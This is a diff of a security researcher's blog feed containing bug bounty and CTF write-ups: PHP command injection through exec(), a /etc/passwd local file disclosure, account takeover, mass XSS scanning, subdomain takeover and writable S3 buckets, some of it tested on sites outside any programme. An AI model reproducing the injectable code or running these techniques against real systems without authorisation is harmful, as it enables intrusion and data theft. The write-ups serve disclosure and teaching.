+&lt;a href=&quot;/images/pp-git-code.png&quot;&gt;&lt;img src=&quot;/images/pp-git-code.png&quot; alt=&quot;Private program git code&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;I quickly found some calls to &lt;code class=&quot;highlighter-rouge&quot;&gt;exec()&lt;/code&gt;, that allow a developper to execute system commands.
+By tracking the creation of the command string, I had notice that a POST parameter was used without any sanitization.
+Simplified, the code looked like this:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'img'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'tmp_name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;image&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$args&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;create_base_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$args&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;nv&quot;&gt;$full_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;upload_dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;base_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;nv&quot;&gt;$command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'chmod 777 %s'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$full_path&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$command&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    
+        &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;create_base_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$args&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;base_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'%s%s%s'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;user_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'p'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;suffix&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;What would you try then? RCE natürlich! The PoC:
+&lt;a href=&quot;/images/pp-rce-1.png&quot;&gt;&lt;img src=&quot;/images/pp-rce-1.png&quot; alt=&quot;Private program rce&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;W00t w00t bounty time :)&lt;/p&gt;
+
+&lt;h2 id=&quot;replay&quot;&gt;Replay&lt;/h2&gt;
+
+&lt;p&gt;Some weeks later, and some others issues later (CORS/CSRF/source code disclosure/rate limit), another SQL injection popped on the main domain.&lt;br /&gt;
+&lt;a href=&quot;/images/pp-sqli.png&quot;&gt;&lt;img src=&quot;/images/pp-sqli.png&quot; alt=&quot;Private program sqli&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Since I said to the company to take care about the vulnerable module where I found the RCE, 1 month later I came back in the same place and tried to reproduce the bug.
+Was fixed, the vulnerable parameter wasn’t anymore.
+But what about all others and what about the other scripts in the repository?&lt;/p&gt;
+
+&lt;p&gt;KA-CHING! Got 3 more RCE.&lt;/p&gt;
+
+&lt;p&gt;One of them required 3 parameters in his input:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;path&lt;/li&gt;
+  &lt;li&gt;filename&lt;/li&gt;
+  &lt;li&gt;contents&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This script wrote the content &lt;code class=&quot;highlighter-rouge&quot;&gt;contents&lt;/code&gt; in the file &lt;code class=&quot;highlighter-rouge&quot;&gt;filename&lt;/code&gt; created in the directory &lt;code class=&quot;highlighter-rouge&quot;&gt;path&lt;/code&gt;.
+The perfect backdoor. Congrats captain Obvious!&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/pp-rce-2.png&quot;&gt;&lt;img src=&quot;/images/pp-rce-2.png&quot; alt=&quot;Private program rce&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;bouncing-from-a-rce-to-another-rce&quot;&gt;Bouncing from a RCE to another RCE&lt;/h2&gt;
+
+&lt;p&gt;Is that fair or not? Well I don’t know but while I was “connected” to the server of the company, and since I knew that they have a functionality to handle images,
+I checked the version of the library ImageMagick.
+&lt;a href=&quot;/images/pp-imagetragick-1.png&quot;&gt;&lt;img src=&quot;/images/pp-imagetragick-1.png&quot; alt=&quot;Private program imagetragick&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;If you’re hunter you probably already heard about the famous &lt;a href=&quot;https://imagetragick.com/&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;ImageTragick&lt;/a&gt;, 
+version prior to 6.9.3-9 are prone to multiple vulnerabilities including RCE.
+Here is the PoC:
+&lt;a href=&quot;/images/pp-imagetragick-2.png&quot;&gt;&lt;img src=&quot;/images/pp-imagetragick-2.png&quot; alt=&quot;Private program imagetragick&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The company was nice enough to reward those two RCE the same day.&lt;/p&gt;
+
+&lt;h2 id=&quot;my-favorite&quot;&gt;My favorite&lt;/h2&gt;
+
+&lt;p&gt;After I had seen the LevelUP 2017 video from the awesome &lt;a href=&quot;https://twitter.com/zseano&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;@zseano&lt;/a&gt;, 
+kudos to him, where he explains how to find bugs by extracting datas from Javascript files, I decided to write my own program to extract endpoints and other juicy infos from source code.
+Once done, I downloaded all JS files I found from my target, and ran my script.
+Needless to say that hundreds of new endpoints popped. 
+One of them catched my eyes:
+&lt;code class=&quot;highlighter-rouge&quot;&gt;/[REDACTED].php?[REDACTED]=[REDACTED]&amp;amp;template=[REDACTED].tpl&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;When you’re a web developper, you know that the extension &lt;code class=&quot;highlighter-rouge&quot;&gt;.tpl&lt;/code&gt; is commonly used for HTML code rendered by template engines.
+Could it be a filename as a parameter???
+I immediately tried the value &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/pp-lfd-1.png&quot;&gt;&lt;img src=&quot;/images/pp-lfd-1.png&quot; alt=&quot;Private program local file disclosure&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok, this is a valid bug. 
+At first, I though it was a Local File Inclusion so I tried to upgrade to RCE with some tools like fimap, dotdotpwn or Kadimus and then manually but nope…
+Since I didn’t know the path of the application on the server, I was not able to include any PHP file.&lt;/p&gt;
+
+&lt;p&gt;When I find a serious bug like this, I always send the report the same day.
+First because I want to avoid a stupid duplicate, second because the company has to be aware of it and fix ASAP!&lt;/p&gt;
+
+&lt;p&gt;The day after, the bug was still here. 
+Hmmm, well well well…
+Ding Dang!
+My brain had a flash, why to not try to include the PHP endpoint itself?!
+Something like:
+&lt;code class=&quot;highlighter-rouge&quot;&gt;/the_vulnerable_script.php?[REDACTED]=[REDACTED]&amp;amp;template=the_vulnerable_script.php&lt;/code&gt;
+Guess what? I got the whole source code and it was not interpreted, so actually this was a Local File Disclosure.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/pp-lfd-2.png&quot;&gt;&lt;img src=&quot;/images/pp-lfd-2.png&quot; alt=&quot;Private program local file disclosure&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Jumping from include to include, I got some config files with database credentials, API keys of 3rd party services and so on…
+After digging for a while, I finally got the Graal aka the hard coded &lt;code class=&quot;highlighter-rouge&quot;&gt;autoload&lt;/code&gt; file. 
+Basically it’s an array with the classname as the keys and the filepath as the values, here is a basic example:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$t_autoload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+	&lt;span class=&quot;s1&quot;&gt;'Auth'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/var/www/project/lib/User/Auth.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;s1&quot;&gt;'User'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/var/www/project/lib/User/User.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;s1&quot;&gt;'Article'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/var/www/project/lib/Article/Article.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;s1&quot;&gt;'Comment'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/var/www/project/lib/Article/Comment.php'&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;In a nutshell (Yaworsk favorite 3 words), I could access to the whole source of the application.
+Not a RCE but still a nice catch :)
+Some minutes later I got a script running and grabbing the files:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/pp-lfd-3.png&quot;&gt;&lt;img src=&quot;/images/pp-lfd-3.png&quot; alt=&quot;Private program local file disclosure&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/pp-lfd-4.png&quot;&gt;&lt;img src=&quot;/images/pp-lfd-4.png&quot; alt=&quot;Private program local file disclosure&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Game over!&lt;/p&gt;
+
+&lt;p&gt;I stayed in touch with the company all along the exploitation of this bug. 
+I stopped my script after a few minutes, I though that would not be fair/polite and legal to download everything.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-last-but-not-the-least&quot;&gt;The last but not the least&lt;/h2&gt;
+
+&lt;p&gt;Using my previous findings, I had some more endpoints in my hands. 
+From here I found 1 more SQL injection, 4 XSS, and another nice one: account takeover.&lt;/p&gt;
+
+&lt;p&gt;In this request, changing my email by the email of any other user will immediately update his password by the one provided. 
+No confirmation needed, I didn’t even need to be authenticated.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/pp-ato.png&quot;&gt;&lt;img src=&quot;/images/pp-ato.png&quot; alt=&quot;Private program account takeover&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;“I got the swag and it’s pumping out my ovaries.”&lt;br /&gt;
+&lt;a href=&quot;https://www.youtube.com/watch?v=PAjYwryn2qY&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;https://www.youtube.com/watch?v=PAjYwryn2qY&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Great thanks to &lt;a href=&quot;https://twitter.com/Hacker0x01&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;@Hacker0x01&lt;/a&gt; and every bug bounty platforms to make this possible.&lt;/p&gt;
+
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/the-bugbounty-program-that-changed-my-life/&quot;&gt;The bug bounty program that changed my life&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on February 11, 2018.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Massive pwnage]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/massive-pwnage/" />
+  <id>http://10degres.net/massive-pwnage</id>
+  <published>2018-02-03T00:00:00+00:00</published>
+  <updated>2018-02-03T00:00:00+00:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;p&gt;There is different ways to hunt for vulnerabilities, depending of your knowledge, your skills, your expectation and how you like to chase.
+I personally love programming and, as a true developper, I’m lazy, so I love to automate things.
+By writing some piece of code or by combining multiple tools, you can find a lot of interesting stuff.
+This article is about some scripts/tricks I wrote/use to perform massive tests:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;XSS with PhantomJS&lt;/li&gt;
+  &lt;li&gt;Heroku subdomain takeover&lt;/li&gt;
+  &lt;li&gt;Amazon S3 buckets theft
+&lt;!--more--&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;xss-with-phantomjs&quot;&gt;XSS with PhantomJS&lt;/h2&gt;
+
+&lt;p&gt;The first thing to do is to get a list of urls to test, it’s like finding endpoints when you perform the recon of a new target.
+And since even an url without any parameter can be vulnerable, it doesn’t matter if our urls have one or several or none.&lt;/p&gt;
+
+&lt;p&gt;Possible sources:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;using the &lt;a href=&quot;https://github.com/googleinurl/SCANNER-INURLBR&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;scanner INURLBR&lt;/a&gt;, you can retrieve a list of urls from many search engines, a simple dork as &lt;code class=&quot;highlighter-rouge&quot;&gt;inurl:&quot;&amp;amp;&quot;&lt;/code&gt; would return many results&lt;/li&gt;
+  &lt;li&gt;a list of subdomains in scope of different bug bounty programs&lt;/li&gt;
+  &lt;li&gt;the list of the most famous xxx websites in whatever country or all around the world&lt;/li&gt;
+  &lt;li&gt;the history of the Wayback Machine&lt;/li&gt;
+  &lt;li&gt;…&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The second thing you need is a good list of payloads.
+You could use the awesome &lt;a href=&quot;https://leanpub.com/xss&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Brutal Cheat Sheet&lt;/a&gt; list or grab another one on the internet or create your own.
+Another good one is the list from RSnake because it contains payloads with a call of an external Javascript, using &lt;a href=&quot;https://xsshunter.com/app&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;XSS Hunter&lt;/a&gt; here could be a good idea, you never know…&lt;/p&gt;
+
+&lt;p&gt;Finally you need a program to automatically test all the urls you grabbed.
+You could probably use Burp Suite but I’m not sure it would be the best tool to test XSS.
+@brutelogic created the magic extension &lt;a href=&quot;https://knoxss.me/&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Knoxss&lt;/a&gt;, you can use the free version.
+However it becomes very complicated when you deal with thousands of urls, I already tried to script it but I was faced to the rate limit of the firewall.
+So I finally created my own script, it was originally based on string comparaison but I recently changed my mind and I implemented PhantomJS which is much more reliable.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ php testxss.php --prefix --suffix --sos --threads=10 --verbose=2
+--phantom=/usr/local/bin/phantomjs --payload=brute-full.txt --urls=urls.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;a href=&quot;/images/massive-xss.png&quot;&gt;&lt;img src=&quot;/images/massive-xss.png&quot; alt=&quot;massive XSS&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;heroku-subdomain-takeover&quot;&gt;Heroku subdomain takeover&lt;/h2&gt;
+
+&lt;p&gt;I recently discovered &lt;a href=&quot;https://dnstrails.com/&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;DNSTrails&lt;/a&gt;, “The World’s Largest Repository of historical DNS data”. 
+Basically it’s a huge database of DNS history.&lt;/p&gt;
+
+&lt;p&gt;After reading the report &lt;a href=&quot;https://hackerone.com/reports/296907&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;#296907&lt;/a&gt; on Hackerone, I had the idea to check the IPs of Heroku.
+I checked my log files and I extracted all IPs I had, linked to &lt;code class=&quot;highlighter-rouge&quot;&gt;herokuapp.com&lt;/code&gt;.
+I have 44 address in my list, they probably own much more but that was enough for a single test.&lt;/p&gt;
+
+&lt;p&gt;Calling the API of DNSTrails, you can retrieve many domains and subdomains configured with those DNS: &lt;code class=&quot;highlighter-rouge&quot;&gt;https://app.securitytrails.com/api/search/by_type/ip/&amp;lt;ip&amp;gt;&lt;/code&gt;
+Looping through the 44 IPs, I got +30k (sub)domains. Doh!&lt;/p&gt;
+
+&lt;p&gt;We all know that a misconfigured Heroku service leads to this page:
+&lt;a href=&quot;/images/heroku-error.png&quot;&gt;&lt;img src=&quot;/images/heroku-error.png&quot; alt=&quot;Heroku error&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;It would be impossible (or very very long) to manually test all domains. Fortunately Michael Henriksen wrote &lt;a href=&quot;https://github.com/michenriksen/aquatone&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Aquatone&lt;/a&gt;.
+This tool can check if a given list of subdomains is vulnerable to subdomain takeover, it supports services like: Heroku, Cloudfront, Zendesk, Uservoice and many others…
+It comes very handy when you deal with so much datas.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ aquatone-takeover --domain herokuapp.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;a href=&quot;/images/massive-subto-aquatone.png&quot;&gt;&lt;img src=&quot;/images/massive-subto-aquatone.png&quot; alt=&quot;massive subdomain takeover Aquatone&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;I also wrote my own script to test some 3rd party services a long time ago, so I also injected my list in it, the result was pretty much the same.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ for d in $(cat domains.txt) ; do php 3rdparty.php -s heroku -d $d ; done
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;a href=&quot;/images/massive-subto-3rdps.png&quot;&gt;&lt;img src=&quot;/images/massive-subto-3rdps.png&quot; alt=&quot;massive subdomain takeover 3rd party services&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s say 10% of the domains are vulnerable.&lt;br /&gt;
+&lt;a href=&quot;&quot;&gt;&lt;img src=&quot;/images/massive-subto-surprise.png&quot; alt=&quot;massive subdomain surprise&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;amazon-s3-buckets-theft&quot;&gt;Amazon S3 buckets theft&lt;/h2&gt;
+
+&lt;p&gt;Here I started to query Threat Crowd with every IP I was able to link to Amazon Service using &lt;a href=&quot;https://bgp.he.net/&quot; target=&quot;_blank&quot;&gt;https://bgp.he.net/&lt;/a&gt; and some other resources.
+&lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.threatcrowd.org/searchApi/v1/api.php?type=ip&amp;amp;query=&amp;lt;ip&amp;gt;&lt;/code&gt;&lt;br /&gt;
+I locally stored the json result and more than 3000 requests later, I got 90k+ unique (sub)domains.&lt;/p&gt;
+
+&lt;p&gt;Ok, things change, so probably some of them are not linked to Cloudfront anymore but hey! It’s worth to try!
+So I wrote a quick script that basically requests every domain in the list and check the response from the server.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ php cloudfront.php domains.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;a href=&quot;/images/massive-bucket-cloudfront.png&quot;&gt;&lt;img src=&quot;/images/massive-bucket-cloudfront.png&quot; alt=&quot;massive bucket cloudfront&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;After extracting all buckets found, about 37000, I ran my tool to test their permissions, maybe some of them are writable? Really??&lt;/p&gt;
+
+&lt;p&gt;About 2300 buckets are world writable, and for 1950 of them any user could alter the permissions, so everything is possible.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/images/massive-bucket-vulnerable.png&quot;&gt;&lt;img src=&quot;/images/massive-bucket-vulnerable.png&quot; alt=&quot;massive bucket vulnerable&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;I don’t know how far this can goes. I think there is no limit to automation when combined with a good imagination and some technical skills, you can always dig deeper and deeper. 
+The problem is, as a hunter, how would you monetize the time you spend on this?&lt;/p&gt;
+
+&lt;p&gt;2 years ago, when I started bug bounty, I was confident enough to think that companies would be happy to be warned of that kind of problems.
+But the responses were very different from a firm to another. Sometimes you get a “WTF?? Who the hell are you? What are you doing with my website?!”, then take care.
+Sometimes a single “Thank you”, no matter if the issue is fixed or not, and sometimes nothing, silence, they simply ignore you…&lt;/p&gt;
+
+&lt;p&gt;As far as I can see, chasing in the wild is fun, you can learn alot, but you won’t make money this way.&lt;/p&gt;
+
+&lt;h2 id=&quot;tools&quot;&gt;Tools&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://gist.github.com/mhmdiaa/adf6bff70142e5091792841d4b372050&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;The script waybackurls.py&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/gwen001/testxss/&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;My tool: testxss&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/gwen001/3rdparty-services&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;My tool: 3party-services&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;http://10degres.net/assets/cloudfront.txt&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;The Cloudfront checker script&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://github.com/gwen001/s3-buckets-finder&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;My tool: s3-buckets-finder&lt;/a&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;http://10degres.net/massive-pwnage/&quot;&gt;Massive pwnage&lt;/a&gt; was originally published by Gwen at &lt;a href=&quot;http://10degres.net&quot;&gt;Gwendal Le Coguic&lt;/a&gt; on February 03, 2018.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[Fail at CTF h1-212 - The Evil Job]]></title>
+ <link rel="alternate" type="text/html" href="http://10degres.net/ctf-h1-212/" />
+  <id>http://10degres.net/ctf-h1-212</id>
+  <published>2017-11-20T00:00:00+00:00</published>
+  <updated>2017-11-20T00:00:00+00:00</updated>
+  <author>
+    <name>Gwen</name>
+    <uri>http://10degres.net</uri>
+    <email>g@10degres.net</email>
+  </author>
+  <content type="html">
+    &lt;p&gt;Hackerone recently released a CTF created by &lt;a href=&quot;https://twitter.com/jobertabma&quot; class=&quot;flashlink&quot; target=&quot;_blank&quot;&gt;Jobert Abma&lt;/a&gt;. Even if I didn’t complete the challenge, it was so exciting and I was so close from the solution that I wanted to share a writeup.
+Here is the tweet that tiggered the war:&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;“Hackers, hack your way to NYC this December for h1-212! An engineer of http://acme.org launched a new server for a new admin panel. He is completely confident that the server can’t be hacked, so he hid a flag. Details: https://www.hackerone.com/blog/hack-your-way-to-nyc-this-december-for-h1-212 …. #TogetherWeHitHarder”&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;And here is the full description:&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;“An engineer of acme.org launched a new server for a new admin panel at http://104.236.20.43/. He is completely confident that the server can’t be hacked. He added a tripwire that notifies him when the flag file is read. He also noticed that the default Apache page is still there, but according to him that’s intentional and doesn’t hurt anyone. Your goal? Read the flag!”&lt;/em&gt;
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;p&gt;Below the different steps that led me to The Holy Flag.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-1-first-things-first-find-an-attack-surface&quot;&gt;Step 1, first things first: find an attack surface&lt;/h2&gt;
+
+&lt;p&gt;As usual when I approach a new target, I immediately fired up my Burp Suite and started a directory scan with several tools like Cansina, Dirb and Dirsearch, each time with a different wordlist: SVNDigger, Robots Disallowed and Raft ones. Below the urls discovered:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://104.236.20.43/index.html
+http://104.236.20.43/icons/README
+http://104.236.20.43/flag
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;At the end of the scan I tried to compare the discovered items with my local Apache using &lt;code class=&quot;highlighter-rouge&quot;&gt;diff&lt;/code&gt; to check if any modification occured but they were all identical.
